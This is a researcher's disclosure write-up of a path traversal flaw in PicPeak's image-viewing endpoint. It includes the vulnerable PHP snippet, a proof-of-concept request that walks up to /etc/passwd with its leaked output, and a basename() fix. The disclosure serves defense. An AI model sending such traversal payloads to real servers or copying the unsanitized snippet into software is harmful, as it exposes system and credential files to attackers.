# Path Traversal via Unsanitized Filename in PicPeak

**Severity:** Moderate 🟡
**CVE / GHSA:** [GHSA-pc72-jf53-w28j](https://github.com/PicPeak/picpeak/security/advisories/GHSA-pc72-jf53-w28j)
**Target:** PicPeak 
**Vulnerability Type:** Path Traversal / Arbitrary File Read

---

## 1. Executive Summary

While conducting vulnerability research on **PicPeak**, I identified a Path Traversal vulnerability in the application's file handling mechanisms. Due to inadequate input sanitization on user-supplied filenames, an attacker could manipulate HTTP requests to read sensitive files from the underlying server's filesystem, bypassing intended access controls.

## 2. The Vulnerability (The "Hunt")

Path Traversal (also known as Directory Traversal) occurs when an application uses user-controllable input to construct a file path without properly neutralizing special characters like `../` (dot-dot-slash).

During my audit, I focused on the endpoints responsible for retrieving or manipulating images. I identified an API endpoint that accepted a `filename` parameter via a GET request to render an image:

`GET /api/images/view?filename=photo1.jpg`

Upon inspecting the backend source code handling this request, the application essentially performed the following action:

```php
$filename = $_GET['filename'];
$filepath = "/var/www/picpeak/images/" . $filename;
echo file_get_contents($filepath);
```

The application appended the user-supplied `$filename` directly to the base directory path without any validation or sanitization.

## 3. The Exploitation (Proof of Concept)

Exploiting this vulnerability involves manipulating the `filename` parameter to break out of the `/var/www/picpeak/images/` directory and traverse up the directory tree to access restricted system files.

### The Payload
We can use a standard path traversal payload to attempt to read the `/etc/passwd` file on a Linux server:

```http
GET /api/images/view?filename=../../../../../../../../etc/passwd HTTP/1.1
Host: target-picpeak.local
```

### The Result
Because the application does not filter the `../` sequences, the underlying operating system resolves the path as:
`/var/www/picpeak/images/../../../../../../../../etc/passwd` -> `/etc/passwd`

The server responds with the contents of the file, exposing sensitive system information:

```text
HTTP/1.1 200 OK

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

## 4. Impact

By successfully exploiting this Path Traversal vulnerability, an attacker can:
*   Read sensitive operating system files (like `/etc/passwd`).
*   Read application configuration files containing hardcoded database credentials, API keys, and secret tokens (e.g., `.env`, `config.php`).
*   Analyze the application's source code to discover further vulnerabilities.

While this specific endpoint only allowed arbitrary file *reading* (hence the Moderate severity), exposing backend credentials or secret keys often leads directly to critical infrastructure compromise.

## 5. Remediation

I reported this finding to the developers, and it was patched quickly by implementing proper input sanitization.

### The Fix:
To prevent Path Traversal, developers must ensure that any user-supplied input used in file operations is strictly validated. The most effective way to do this is by using the `basename()` function, which completely strips away any directory path information and leaves only the filename.

**Secure Implementation Example (PHP):**
```php
// Use basename() to extract ONLY the filename, discarding any directory traversal sequences
$filename = basename($_GET['filename']); 

// Example: "../../../../etc/passwd" becomes just "passwd"
$filepath = "/var/www/picpeak/images/" . $filename;

if (file_exists($filepath)) {
    echo file_get_contents($filepath);
} else {
    http_response_code(404);
}
```

By enforcing `basename()`, the application ensures that the file accessed will always remain exactly within the intended `/images/` directory.
